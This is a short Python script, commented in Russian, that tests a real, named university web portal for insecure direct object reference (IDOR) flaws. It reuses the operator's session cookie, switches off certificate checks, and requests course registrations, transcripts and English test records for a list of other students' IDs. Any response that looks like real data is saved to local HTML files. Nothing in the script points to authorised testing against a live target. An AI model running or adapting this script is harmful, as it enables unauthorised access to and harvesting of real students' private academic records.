#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings()

# === ВСТАВЬ СВОИ COOKIES ИЗ DEVTOOLS ===
cookies = {
    ".AspNetCore.Cookies": "ЗАМЕНИ_НА_СВОЙ_COOKIE_ИЗ_DEVTOOLS",
}

session = requests.Session()
session.cookies.update(cookies)
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
})

# === ТВОЙ ID ===
MY_ID = "1948"

# === ТЕСТОВЫЕ ID ДЛЯ ПРОВЕРКИ IDOR ===
TEST_IDS = ["1948", "1875", "1874", "1876", "1", "100", "9999"]

# === ENDPOINTS ===
ENDPOINTS = [
    "/StudentCourseRegistrations/GetStudentCourses",
    "/StudentTranscripts/StudentTranscript",
    "/StudentTranscripts/StudentEnglishLevelTests",
]

for ep in ENDPOINTS:
    print(f"\n{'='*60}")
    print(f"ENDPOINT: {ep}")
    print(f"{'='*60}")
    for sid in TEST_IDS:
        url = f"https://my.iuca.kg{ep}?studentId={sid}"
        try:
            r = session.get(url, timeout=10, verify=False, allow_redirects=False)
            # Проверяем размер ответа и статус
            size = len(r.content)
            is_redirect = r.status_code in (301, 302, 303, 307, 308)
            print(f"  [{r.status_code}] studentId={sid}  ({size} bytes){' REDIRECT' if is_redirect else ''}")
            # Если 200 и размер похож на реальные данные — сохраняем
            if r.status_code == 200 and size > 5000:
                path = f"idor_result_{ep.split('/')[-1]}_{sid}.html"
                with open(path, "w", encoding="utf-8") as f:
                    f.write(r.text)
                print(f"       -> SAVED: {path}")
        except Exception as e:
            print(f"  [ERR] studentId={sid}: {e}")

print("\n[+] DONE")